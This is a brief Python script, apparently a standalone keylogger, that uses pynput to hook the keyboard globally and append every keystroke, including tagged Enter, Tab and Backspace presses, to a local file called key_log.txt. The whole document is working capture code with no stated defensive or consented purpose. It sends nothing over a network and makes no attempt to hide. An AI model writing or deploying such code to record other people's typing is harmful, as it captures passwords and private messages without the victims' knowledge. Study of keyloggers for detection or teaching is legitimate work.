from pynput import keyboard

log_file = "key_log.txt"

def on_press(key):
    with open(log_file, "a") as f:
        try:
            f.write(f"{key.char}")
        except AttributeError:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n[ENTER]\n")
            elif key == keyboard.Key.tab:
                f.write("[TAB]")
            elif key == keyboard.Key.backspace:
                f.write("[BACKSPACE]")
            else:
                f.write(f" [{key}] ")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
